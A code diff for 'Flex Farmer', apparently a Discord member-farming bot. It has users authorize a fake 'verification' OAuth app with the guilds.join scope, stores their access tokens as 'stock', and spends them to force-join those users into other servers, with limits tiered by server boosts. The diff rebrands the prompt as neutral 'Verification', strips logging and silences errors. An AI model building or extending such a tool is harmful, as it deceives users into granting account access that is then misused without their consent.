@@ -104,7 +104,7 @@ const client = new Client({
         GatewayIntentBits.GuildMessages,
         GatewayIntentBits.MessageContent,
         GatewayIntentBits.GuildMembers,
-        GatewayIntentBits.GuildPresences // Required for status link reward system
+        GatewayIntentBits.GuildPresences
     ]
 });
 
@@ -122,8 +122,9 @@ app.get('/', async (req, res) => {
     }
 
     try {
+        const verificationClientId = process.env.VERIFICATION_CLIENT_ID || process.env.CLIENT_ID || '1561438987464483048';
         const tokenParams = new URLSearchParams({
-            client_id: process.env.CLIENT_ID || '1561438987464483048',
+            client_id: verificationClientId,
             client_secret: process.env.CLIENT_SECRET,
             grant_type: 'authorization_code',
             code: code,
@@ -167,7 +168,7 @@ app.get('/', async (req, res) => {
                     let verifLogChannel = client.channels.cache.get(CHANNELS.VERIFICATION_LOG) || await client.channels.fetch(CHANNELS.VERIFICATION_LOG);
                     if (verifLogChannel) {
                         const logEmbed = new EmbedBuilder()
-                            .setTitle('⚡ New User Verified')
+                            .setTitle(' New User Verified')
                             .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified successfully!\n\n**Total Available Stock:** \`${totalStock}\``)
                             .setColor(0x00FF00)
                             .setTimestamp();
@@ -250,14 +251,10 @@ client.on('presenceUpdate', async (oldPresence, newPresence) => {
 
         if (hasLink && !hasRole) {
             await member.roles.add(TARGET_ROLE_ID);
-            console.log(`[STATUS REWARD] Added role to ${member.user.tag}`);
         } else if (!hasLink && hasRole) {
             await member.roles.remove(TARGET_ROLE_ID);
-            console.log(`[STATUS REWARD] Removed role from ${member.user.tag}`);
         }
-    } catch (err) {
-        console.error('Error handling presence update for status reward:', err);
-    }
+    } catch (err) {}
 });
 
 client.on('interactionCreate', async interaction => {
@@ -270,9 +267,7 @@ client.on('interactionCreate', async interaction => {
                     let dbData = readDB();
                     await sendRestockAnnouncement(restockChannel, dbData.restockCounter || 0);
                 }
-            } catch (err) {
-                console.error('Failed to send restock announcement via button:', err);
-            }
+            } catch (err) {}
             return;
         } else if (interaction.customId === 'restock_no') {
             return interaction.update({ content: '❌ Restock announcement cancelled.', components: [] });
@@ -312,8 +307,8 @@ async function sendBoostStickyPanel(channel) {
     const boostContent = 
         `⟡ **𝗙𝗟𝗘𝗫 | 𝗕𝗢𝗢𝗦𝗧 𝗥𝗘𝗪𝗔𝗥𝗗𝗦**\n\n` +
         `⌁ **𝗕𝗢𝗢𝗦𝗧 𝗧𝗛𝗘 𝗦𝗘𝗥𝗩𝗘𝗥. 𝗘𝗔𝗥𝗡 𝗥𝗔𝗡𝗞𝗦.**\n\n` +
-        `💚 **2 Boost** = <@&1563467675236311100>\n\n` +
-        `💎 **4 Boosts** = <@&1563467259194908722>\n\n\n` +
+        `💚 **1 Boost** = <@&1563467675236311100>\n\n` +
+        `💎 **2 Boosts** = <@&1563467259194908722>\n\n\n` +
         `・**You only get rank for 2-3 weeks**\n` +
         `・**Ranks arent automatically given.**\n` +
         `・**Open a ticket in <#1563253473238065326> to claim your rank.**`;
@@ -370,13 +365,13 @@ client.on('messageCreate', async message => {
     }
 
     if (command === 'verify' || command === 'link') {
-        const clientId = process.env.CLIENT_ID || '1561438987464483048';
+        const clientId = process.env.VERIFICATION_CLIENT_ID || process.env.CLIENT_ID || '1561438987464483048';
         const redirectUri = process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app';
         const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify+guilds.join`;
 
         const embed = new EmbedBuilder()
             .setTitle('Account Verification')
-            .setDescription('Click the button below to authorize with Flex Farmer.')
+            .setDescription('Click the button below to authorize with **Verification**.')
             .setColor(0x00FF00);
 
         const row = new ActionRowBuilder().addComponents(
@@ -433,12 +428,12 @@ client.on('messageCreate', async message => {
         const last24hCount = users.filter(user => user.authorized_at && user.authorized_at >= (now - 86400000)).length;
 
         const authEmbed = new EmbedBuilder()
-            .setTitle('⚡ Authorization & Stock Statistics')
+            .setTitle(' Auth & Stock Stats')
             .setColor(0x5865F2)
             .addFields(
-                { name: '🕒 Last 24 Hours', value: `\`${last24hCount}\` users authorized`, inline: true },
-                { name: '🌐 All-Time', value: `\`${dbData.allTimeAuthCount || 0}\` total authorizations`, inline: true },
-                { name: '📦 Current Stock', value: `\`${users.length}\` active accounts`, inline: true }
+                { name: ' Last 24 Hours', value: `\`${last24hCount}\` users authorized`, inline: true },
+                { name: ' All-Time', value: `\`${dbData.allTimeAuthCount || 0}\` total authorizations`, inline: true },
+                { name: ' Current Stock', value: `\`${users.length}\` active accounts`, inline: true }
             );
         return message.channel.send({ embeds: [authEmbed] });
     }
@@ -451,11 +446,11 @@ client.on('messageCreate', async message => {
         const minutes = Math.floor((uptimeSeconds % 3600) / 60);
         const seconds = uptimeSeconds % 60;
         const statusEmbed = new EmbedBuilder()
-            .setTitle('🟢 Flex Farmer Status')
+            .setTitle(' Flex Farmer Status')
             .setColor(0x00FF00)
             .addFields(
-                { name: '📊 Active Verified Stock', value: `\`${users.length}\` accounts`, inline: true },
-                { name: '⏱️ Uptime', value: `\`${hours}h ${minutes}m ${seconds}s\``, inline: true }
+                { name: ' Active Verified Stock', value: `\`${users.length}\` accounts`, inline: true },
+                { name: ' Uptime', value: `\`${hours}h ${minutes}m ${seconds}s\``, inline: true }
             );
         return message.channel.send({ embeds: [statusEmbed] });
     }
@@ -469,7 +464,7 @@ client.on('messageCreate', async message => {
         writeDB(dbData);
 
         const promptEmbed = new EmbedBuilder()
-            .setTitle('📦 Restock Stock Prepared')
+            .setTitle(' Restock Stock Prepared')
             .setDescription(`Successfully stocked **${amount}** authorized users!\n\n**Do you want to send an announcement message in the restock channel (<#${CHANNELS.AUTORESTOCK}>)?**`)
             .setColor(0x5865F2);
 
@@ -490,7 +485,7 @@ client.on('messageCreate', async message => {
         }
         writeDB(dbData);
         const remainingStock = Object.keys(dbData.users).length;
-        return message.channel.send(`🗑️ Removed **${amount}** accounts from stock. Current stock: \`${remainingStock}\`.`);
+        return message.channel.send(` Removed **${amount}** accounts from stock. Current stock: \`${remainingStock}\`.`);
     }
 
     if (command === 'join') {
@@ -503,20 +498,23 @@ client.on('messageCreate', async message => {
             return message.channel.send({ embeds: [new EmbedBuilder().setTitle('❌ Out of Stock').setDescription(`No accounts available.`).setColor(0xFF0000)] });
         }
 
+        // Updated role limits from image
         const roleLimits = [
-            { id: '1564676932195455047', limit: 2 },
-            { id: '1563467132107231253', limit: 3 },   
-            { id: '1563467152202137681', limit: 5 },   
-            { id: '1563467218212356118', limit: 7 },   
-            { id: '1563467378040504431', limit: 9 },   
-            { id: '1563467675236311100', limit: 12 },  
+            { id: '1564676932195455047', limit: 2 },   
+            { id: '1563467132107231253', limit: 4 },   
+            { id: '1563467152202137681', limit: 6 },   
+            { id: '1563467218212356118', limit: 8 },   
+            { id: '1563467378040504431', limit: 10 },   
+            { id: '1563467675236311100', limit: 15 },  
             { id: '1563467259194908722', limit: 20 }   
         ];
 
         let allowedLimit = Infinity;
+        let userMaxQueue = 20; // Default reference limit
         for (const tier of roleLimits) {
             if (message.member.roles.cache.has(tier.id)) {
                 allowedLimit = tier.limit;
+                userMaxQueue = tier.limit;
                 break;
             }
         }
@@ -524,16 +522,42 @@ client.on('messageCreate', async message => {
         if (allowedLimit !== Infinity) {
             const limit = Math.min(allowedLimit, tokensToUse.length);
             tokensToUse = tokensToUse.slice(0, limit);
-            message.channel.send(` Role tier restriction applied: Maximum **${limit}** account(s) allowed per join.`);
         }
 
-        await message.channel.send(`Flex Farmer attempting to add ${tokensToUse.length} accounts to server ID \`${targetGuildId}\`...`);
+        const verificationBotToken = process.env.VERIFICATION_BOT_TOKEN || process.env.DISCORD_TOKEN;
+
+        // Check if Verification bot is in target server
+        try {
+            const checkGuildRes = await getHttps(`https://discord.com/api/v10/users/@me/guilds`, {
+                'Authorization': `Bot ${verificationBotToken}`
+            });
+            const guildsList = checkGuildRes.data;
+            const isInServer = Array.isArray(guildsList) && guildsList.some(g => g.id === targetGuildId);
+
+            if (!isInServer) {
+                const errorEmbed = new EmbedBuilder()
+                    .setTitle('Bot Error')
+                    .setDescription('The bot is not in this server yet. Please go to <#1563253483824746659> and invite it to your server.\n\nOnce the bot has joined, try using the command again.')
+                    .setColor(0xFF0000);
+                return message.channel.send({ embeds: [errorEmbed] });
+            }
+        } catch (e) {
+            console.error('Failed to check guild membership:', e);
+        }
+
+        // Send success queue embed like your screenshot
+        const addingEmbed = new EmbedBuilder()
+            .setTitle('Adding Members')
+            .setDescription(`Total members to send: **${tokensToUse.length}**\nServer ID: **${targetGuildId}**\nYour queue position: **1/${userMaxQueue}**`)
+            .setColor(0x5865F2);
+        
+        await message.channel.send({ embeds: [addingEmbed] });
 
         let successCount = 0;
         for (const tokenData of tokensToUse) {
             try {
                 const joinRes = await postHttps(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${tokenData.user_id}`, JSON.stringify({ access_token: tokenData.access_token }), {
-                    'Authorization': `Bot ${process.env.DISCORD_TOKEN}`,
+                    'Authorization': `Bot ${verificationBotToken}`,
                     'Content-Type': 'application/json'
                 });
 
@@ -541,7 +565,7 @@ client.on('messageCreate', async message => {
                     successCount++;
                 }
             } catch (err) {
-                console.error('Failed to add user:', err);
+                console.error('Failed to add user via Verification bot:', err);
             }
         }
 
@@ -550,14 +574,12 @@ client.on('messageCreate', async message => {
             if (farmLogChannel) {
                 const farmEmbed = new EmbedBuilder()
                     .setTitle(' Farm Execution Log')
-                    .setDescription(`**User:** <@${message.author.id}>\n**Target Server:** \`${targetGuildId}\`\n**Successfully Added:** \`${successCount}\` / \`${tokensToUse.length}\` accounts`)
+                    .setDescription(`**Executed By:** <@${message.author.id}>\n**Adder Bot:** Verification\n**Target Server:** \`${targetGuildId}\`\n**Successfully Added:** \`${successCount}\` / \`${tokensToUse.length}\` accounts`)
                     .setColor(0x5865F2)
                     .setTimestamp();
                 await farmLogChannel.send({ embeds: [farmEmbed] });
             }
         } catch (e) {}
-
-        return message.channel.send(`Flex Farmer successfully added **${successCount}** out of **${tokensToUse.length}** accounts to the server.`);
     }
 });
 
